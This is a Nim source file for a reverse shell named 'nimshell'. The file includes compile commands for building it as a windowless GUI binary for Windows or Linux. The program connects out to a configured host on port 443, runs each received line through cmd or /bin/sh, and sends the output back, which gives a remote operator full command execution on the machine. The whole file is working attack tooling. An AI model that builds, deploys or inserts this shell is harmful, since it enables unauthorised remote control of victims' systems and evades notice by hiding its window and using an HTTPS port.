# To Compile From Linux to Windows : 
# nim c --app:gui -d:mingw nimshell.nim
# To Compile From Linux to Linux :
# nim c --app:gui -d:release shell.nim

import net
import osproc
let
    ip = "127.0.0.1"
    port = 443
    socket = newSocket()
    prompt = "nimshell>"

var cmd : string

if system.hostOS == "windows":
    cmd = "cmd /C "
else:
    cmd = "/bin/sh -c "
try:
    socket.connect(ip, Port(port))

    while true:
        try:
            socket.send(prompt)
                
            var input = socket.recvLine()
            if input == "disconnect" or input == "exit":
                socket.send("[+] Exiting Nim Shell\n")
                socket.close()
                system.quit(0)
                
            var (result, _) = execCmdEx(cmd & input)
            socket.send(result)
            
        except:
            socket.send("[-] Unexpected error received, Exiting Nim Shell'\n")
            socket.close()
            system.quit(0)
except:
    socket.close()
    system.quit(0)

